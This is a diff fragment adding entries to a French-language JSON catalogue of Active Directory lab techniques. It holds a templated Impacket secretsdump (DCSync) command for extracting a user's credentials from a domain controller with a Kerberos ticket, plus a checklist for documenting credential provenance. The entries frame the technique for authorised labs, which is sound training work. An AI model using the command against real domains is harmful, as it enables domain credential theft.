+      "phase": "Secrets",
+      "tool": "Impacket",
+      "command": "KRB5CCNAME={{ticket}} impacket-secretsdump -k -no-pass -dc-ip {{target}} -just-dc-user {{targetUser}} {{domain}}/{{user}}@{{dcHost}}",
+      "summary": "Réplication ciblée en laboratoire avec droits réellement accordés.",
+      "requires": "DCSync/replication permissions validées; TGT réel de l’identité; scope autorisé.",
+      "reading": "Un local admin ou un ticket de service ne donne pas automatiquement DCSync.",
+      "next": "Expliquer la provenance de l’identité et stocker le secret hors historique/Git.",
+      "risk": "sensible",
+      "source": "https://github.com/fortra/impacket/blob/master/examples/secretsdump.py",
+      "tags": [
+        "lab-advance",
+        "kerberos"
+      ],
+      "category": "Domain control"
+    },
+    {
+      "id": "credential-provenance",
+      "title": "Carnet de preuves : provenance d’une identité",
+      "phase": "Dépannage",
+      "tool": "Note",
+      "command": "Pour chaque pivot :\n(1) quel fichier/ACE/log a révélé le compte ?\n(2) comment le secret a-t-il été récupéré, ou fourni par un tiers ?\n(3) ticket / principal / SPN exact et durée ?\n(4) quel service a accepté ?\n(5) quel droit a été prouvé ?\n(6) quelle modification restaurer ?\nLabel: VERIFIED / EXTERNAL / HYPOTHESIS / UNRESOLVED.",
+      "summary": "Éviter de confondre un mot de passe prêté avec un chemin de découverte reproductible.",
+      "requires": "Journal de lab et séparation secrets/preuves.",
+      "reading": "Les flags ou identifiants qui fonctionnent ne prouvent pas le chemin intended.",
+      "next": "Documenter la chaîne et repartir sans reprendre les secrets en clair.",
+      "risk": "lecture",
+      "source": "https://bloodhound.specterops.io/",
+      "tags": [
+        "tooling",
+        "defense"
+      ],
+      "category": "Méthodologie"
+    }
+  ]
+}
